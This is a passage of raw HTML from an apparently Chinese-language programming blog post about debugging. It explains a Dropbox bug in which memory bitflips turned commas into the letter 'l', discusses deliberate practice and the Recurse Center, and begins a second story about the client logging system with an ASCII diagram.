class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nl \\x0c &lt; $ ( . -</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6258da6400e792581157-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6258da6400e792581157-1\"><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x0c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>逗号的 ascii 码是 44 ，<code>l</code>的 ascii 码是 108，在二进制中，它们是这表示的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6258da64012883854077\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbin(ord(',')): 0101100  \r\nbin(ord('l')): 1101100</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6258da64012883854077-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da64012883854077-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6258da64012883854077-1\"><span class=\"crayon-e\">bin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">ord</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">','</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0101100</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da64012883854077-2\"><span class=\"crayon-e\">bin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">ord</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'l'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1101100</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>你将发现<code>l</code>与逗号仅仅相差 1 位。而这就是问题所在：一个位翻转 (bitflip）。客户端使用的内存有一个 bit 损坏了，现在客户端正在向服务器发送垃圾请求。</p>\n<p>下面是出现位翻转时我们经常看到代替逗号的其他字符：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6258da64015600537089\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n,    : 0101100\r\nl    : 1101100\r\n\\x0c : 0001100\r\n&lt;    : 0111100\r\n$    : 0100100\r\n(    : 0101000\r\n.    : 0101110\r\n-    : 0101101</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6258da64015600537089-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da64015600537089-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da64015600537089-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da64015600537089-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da64015600537089-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da64015600537089-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da64015600537089-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da64015600537089-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6258da64015600537089-1\"><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0101100</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da64015600537089-2\"><span class=\"crayon-v\">l</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1101100</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da64015600537089-3\"><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x0c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0001100</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da64015600537089-4\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0111100</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da64015600537089-5\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0100100</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da64015600537089-6\"><span class=\"crayon-sy\">(</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0101000</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da64015600537089-7\"><span class=\"crayon-sy\">.</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0101110</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da64015600537089-8\"><span class=\"crayon-o\">-</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0101101</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p></p>\n<h3>位翻转是真实存在的！</h3>\n<p>我热爱这个 bug 是因为它证明了位翻转是真实存在的，而不只是理论概念。实际上，这种情况在一些领域中比其他领域更常见。 从低端或老硬件的用户获得请求是其中一个，这是很多运行 Dropbox 的笔记本电脑的真实情况。 另外一个有很多位翻转的领域是外层空间——太空没有大气层来保护内存免受高能粒子和辐射的影响，所以位翻转很常见。</p>\n<p>在太空中，你可能真的非常关心数据的正确性。比如，你的代码可能用于让国际空间站中的宇航员生存下去，即使不是这样的关键任务，在太空中进行软件更新是很难的。如果真的需要应用程序不存在位翻转 ，可以采取多种硬件和软件方法。对于这个问题，Katie Betchold 有一个<span class=\"\"><a href=\"http://www.youtube.com/watch?v=ETgNLF_XpEM\">非常有趣的演讲</a></span>。</p>\n<p>Dropbox 不需要处理位翻转 。损坏内存的电脑是用户的，我们可以检测到逗号是否发生了位翻转，但如果它是不同的字符，我们不一定会知道，如果位翻转发生在磁盘读取的实际文件中，我们就不知道了。我们可以发现这个问题的空间太有限了，因此我们决定不对异常进行处理并继续。这类 bug 通常可以通过客户端重启电脑解决。</p>\n<h3>不容易发生的 bug 并不是不可能的</h3>\n<p>这是它成为我最喜欢的 bug 的原因之一。 它可以提醒我们 unlikely 和 impossible 的区别。 在足够的规模下， unlikely 事件以明显的速率发生。</p>\n<h3>通用 bug</h3>\n<p>我最喜欢这个错误的第二个原因在于通用。 这个 bug 可能发生在桌面客户端与 server 通信的任何位置，系统中有很多不同的端点和组件。这意味着 Dropbox 的许多工程师将会看到这个 bug 的不同版本。当你第一次看到它时，真的非常伤脑筋，但是之后很容易诊断，而且检查非常快：只需要看看中间的字符是不是<code>l</code>。</p>\n<h3>文化差异</h3>\n<p>这个 bug 的一个有趣的副作用是它暴露了服务器团队和客户端团队的文化差异。 有时候服务器小组的成员会发现这个 bug 并进行调查。 如果一台服务器正在翻转位，这可能不是偶然的现象 – 很可能是内存损坏，你需要找到受影响的机器并尽快将其从服务器池中移出，否则可能会损坏大量的用户数据。 这是一个事件，你需要快速回应。 但是，如果用户的机器正在损坏数据，那么可以做的事情就不多了。</p>\n<h3>分享你的 Bug</h3>\n<p>所以，如果你正在研究一个令人困惑的 bug ，特别是大系统中的一个 bug ，不要忘了与别人交流。 也许你的同事之前看到过一个这样 bug 。 如果他们看到过，可以节省很多时间。 如果他们不知道，记得告诉别人解决问题的方法 – 写下来或在团队会议上讲出来。 下一次你们的队伍有类似的事情发生时，你们会更有准备。</p>\n<h2>Bug 如何帮助我们学习</h2>\n<h3>Recurse Center</h3>\n<p>加入 Dropbox 之前，我在 Recurse Center (RC) 工作。RC 是一个社区，它的的理念是帮助具备自我导向的学习者通过协作共同成长为更好的程序员。这是 RC 的全部：这里没有任何课程、作业或者截止日期。唯一的课题是分享变为更好的程序员的目标。我们看到很多获得 CS 学位但是对实际编程没有把握的人参加这个项目，或者写了十年 Java 又想学习 Clojure 或者 Haskell 的人参加这个项目，当然还有很多其他的参与者。</p>\n<p>我的工作是推进者，工作职责是帮助用户填补缺乏的结构和根据从以前的参与者身上学到的东西提供指导。 所以我和我的同事对于帮助自我激励的成年人学习最好的技术非常感兴趣。</p>\n<h3>刻意练习</h3>\n<p>这个领域有很多不同的研究，我认为最有趣的一项研究是刻意练习的思想。刻意练习试图解释专家与业余爱好者的差别。这里的指导原则是，如果你只关注与生俱来的特征-遗传或其他-它们不会对解释差异做出太大贡献。因此研究人员（开始是 Ericsson , Krampe 和 Tesch-Romer ）开始研究是什么造成了这些差异。他们的结论是花费在刻意练习上的时间。</p>\n<p>刻意练习定义的范围非常狭窄：不是为了报酬，也不是为了玩乐。我们必须在自己能力的边缘进行练习，做一个适合自己水平的项目（不会容易的学不到任何东西，也不会困难到毫无进展）。还必须获得做法是否有效的及时反馈。</p>\n<p>这非常令人兴奋，因为这是如何构建专业知识的框架。但是挑战在于，对于程序员来讲，这个建议难以实现。程序员很难知道自己是否在能力边缘工作，及时反馈也非常罕见（在某些情况下可能会立即得到反馈，而在其他情况下可能需要几个月的时间才会有反馈）。你可以在 REPL 等一些小事上得到快速反馈，但是如何进行设计决策或者选择技术，很可能很长时间都无法得到反馈。</p>\n<p>但是刻意练习对于调试代码非常有用。如果编写代码，编代码时会有代码如何工作的心智模式。如果代码有一个 bug ，那么心智模式并不完全正确。根据刻意练习的定义，你处在理解的边缘，太棒了，你即将学习新的东西。如果你能够重现 bug ，那么可以立即获得修复是否正确的反馈（这种情况非常罕见）。</p>\n<p>这种类型的 bug 可能会使你了解一些关于自己程序的信息，也有可能学到代码所运行的系统的更多内容。我这里有一个这样的 bug 的故事。</p>\n<h2>第二个 Bug</h2>\n<p>这个 bug 也是在 Dropbox 工作时遇到的。那时，我正在研究为什么有些桌面客户端不按时发送日志 。我深入研究了客户端日志系统并发现一些有意思的 bug 。我们这里谈到的只是其中与这个故事有关一部分 。</p>\n<p>下面是系统架构简图。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6258da6401c796791847\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n                                   +--------------+\r\n                                   |              |\r\n               +---+  +----------&gt; |  LOG SERVER  |\r\n               |log|  |            |              |\r\n               +---+  |            +------+-------+\r\n                      |                   |\r\n                +-----+----+              |  200 ok\r\n                |          |              |\r\n                |  CLIENT  |  &lt;-----------+\r\n                |          |\r\n                +-----+----+\r\n                      ^\r\n                      +--------+--------+--------+\r\n                      |        ^        ^        |\r\n                   +--+--+  +--+--+  +--+--+  +--+--+\r\n                   | log |  | log |  | log |  | log |\r\n                   |     |  |     |  |     |  |     |\r\n                   |     |  |     |  |     |  |     |\r\n                   +-----+  +-----+  +-----+  +-----+</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6258da6401c796791847-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6401c796791847-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6401c796791847-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6401c796791847-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6401c796791847-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6401c796791847-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6401c796791847-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6401c796791847-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6401c796791847-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6401c796791847-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6401c796791847-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6401c796791847-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6401c796791847-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6401c796791847-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6401c796791847-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6401c796791847-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6401c796791847-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6401c796791847-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6401c796791847-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6258da6401c796791847-1\"><span class=\"crayon-h\">                                   </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6401c796791847-2\"><span class=\"crayon-h\">                                   </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">              </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6401c796791847-3\"><span class=\"crayon-h\">               </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-e\">LOG </span><span class=\"crayon-v\">SERVER</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6401c796791847-4\"><span class=\"crayon-h\">               </span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">            </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">              </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6401c796791847-5\"><span class=\"crayon-h\">               </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">            </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6401c796791847-6\"><span class=\"crayon-h\">                      </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                   </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6401c796791847-7\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">              </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">200</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ok</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6401c796791847-8\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">              </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6401c796791847-9\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">CLIENT</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6401c796791847-10\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6401c796791847-11\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6401c796791847-12\"><span class=\"crayon-h\">                      </span><span class=\"crayon-o\">^</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6401c796791847-13\"><span class=\"crayon-h\">                      </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6401c796791847-14\"><span class=\"crayon-h\">                      </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">^</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">^</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6401c796791847-15\"><span class=\"crayon-h\">                   </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6401c796791847-16\"><span class=\"crayon-h\">                   </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6401c796791847-17\"><span class=\"crayon-h\">                   </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6401c796791847-18\"><span class=\"crayon-h\">                   </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6401c796791847-19\"><span class=\"crayon-h\">                   </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span 